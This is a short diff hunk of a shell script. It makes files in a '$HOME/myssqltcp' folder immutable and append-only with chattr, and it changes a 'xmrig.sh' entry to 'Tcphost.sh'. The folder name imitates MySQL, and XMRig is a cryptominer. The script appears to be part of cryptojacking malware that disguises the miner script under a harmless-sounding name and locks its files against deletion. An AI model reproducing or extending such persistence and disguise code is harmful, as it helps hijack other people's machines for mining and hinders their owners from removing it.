@@ -28,7 +28,7 @@ chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
 chattr -V +iau $HOME/myssqltcp/logserver.sh
 chattr -V +iau $HOME/myssqltcp/addconf.sh
 chattr -V +iau $HOME/myssqltcp/MyssqlTcp
-chattr -V +iau $HOME/myssqltcp/xmrig.sh
+chattr -V +iau $HOME/myssqltcp/Tcphost.sh
 chattr -V +iau $HOME/myssqltcp/config_background.json
 chattr -V +iau $HOME/myssqltcp/config.json
 
